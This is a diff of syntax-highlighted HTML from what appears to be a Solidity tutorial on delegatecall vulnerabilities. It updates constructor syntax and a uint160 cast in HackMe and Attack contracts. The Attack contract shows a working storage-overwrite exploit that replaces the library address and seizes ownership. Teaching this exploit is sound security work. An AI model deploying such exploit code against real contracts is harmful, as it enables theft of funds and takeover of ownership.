@@ -50,7 +50,7 @@ caller of HackMe, in this case Attack.
     <span class=\\"hljs-keyword\\">address</span> <span class=\\"hljs-keyword\\">public</span> owner;
     Lib <span class=\\"hljs-keyword\\">public</span> lib;
 
-    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">constructor</span>(<span class=\\"hljs-params\\">Lib _lib</span>) <span class=\\"hljs-title\\"><span class=\\"hljs-keyword\\">public</span></span> </span>{
+    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">constructor</span>(<span class=\\"hljs-params\\">Lib _lib</span>) </span>{
         owner = <span class=\\"hljs-built_in\\">msg</span>.<span class=\\"hljs-built_in\\">sender</span>;
         lib = Lib(_lib);
     }
@@ -63,7 +63,7 @@ caller of HackMe, in this case Attack.
 <span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">contract</span> <span class=\\"hljs-title\\">Attack</span> </span>{
     <span class=\\"hljs-keyword\\">address</span> <span class=\\"hljs-keyword\\">public</span> hackMe;
 
-    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">constructor</span>(<span class=\\"hljs-params\\"><span class=\\"hljs-keyword\\">address</span> _hackMe</span>) <span class=\\"hljs-title\\"><span class=\\"hljs-keyword\\">public</span></span> </span>{
+    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">constructor</span>(<span class=\\"hljs-params\\"><span class=\\"hljs-keyword\\">address</span> _hackMe</span>) </span>{
         hackMe = _hackMe;
     }
 
@@ -109,7 +109,7 @@ change the owner.
     <span class=\\"hljs-keyword\\">address</span> <span class=\\"hljs-keyword\\">public</span> owner;
     <span class=\\"hljs-keyword\\">uint</span> <span class=\\"hljs-keyword\\">public</span> someNumber;
 
-    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">constructor</span>(<span class=\\"hljs-params\\"><span class=\\"hljs-keyword\\">address</span> _lib</span>) <span class=\\"hljs-title\\"><span class=\\"hljs-keyword\\">public</span></span> </span>{
+    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">constructor</span>(<span class=\\"hljs-params\\"><span class=\\"hljs-keyword\\">address</span> _lib</span>) </span>{
         lib = _lib;
         owner = <span class=\\"hljs-built_in\\">msg</span>.<span class=\\"hljs-built_in\\">sender</span>;
     }
@@ -128,13 +128,13 @@ change the owner.
 
     HackMe <span class=\\"hljs-keyword\\">public</span> hackMe;
 
-    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">constructor</span>(<span class=\\"hljs-params\\">HackMe _hackMe</span>) <span class=\\"hljs-title\\"><span class=\\"hljs-keyword\\">public</span></span> </span>{
+    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">constructor</span>(<span class=\\"hljs-params\\">HackMe _hackMe</span>) </span>{
         hackMe = HackMe(_hackMe);
     }
 
     <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">attack</span>(<span class=\\"hljs-params\\"></span>) <span class=\\"hljs-title\\"><span class=\\"hljs-keyword\\">public</span></span> </span>{
         <span class=\\"hljs-comment\\">// override address of lib</span>
-        hackMe.doSomething(<span class=\\"hljs-keyword\\">uint</span>(<span class=\\"hljs-keyword\\">address</span>(<span class=\\"hljs-built_in\\">this</span>)));
+        hackMe.doSomething(<span class=\\"hljs-keyword\\">uint</span>(<span class=\\"hljs-keyword\\">uint160</span>(<span class=\\"hljs-keyword\\">address</span>(<span class=\\"hljs-built_in\\">this</span>))));
         <span class=\\"hljs-comment\\">// pass any number as input, the function doSomething() below will</span>
         <span class=\\"hljs-comment\\">// be called</span>
         hackMe.doSomething(<span class=\\"hljs-number\\">1</span>);
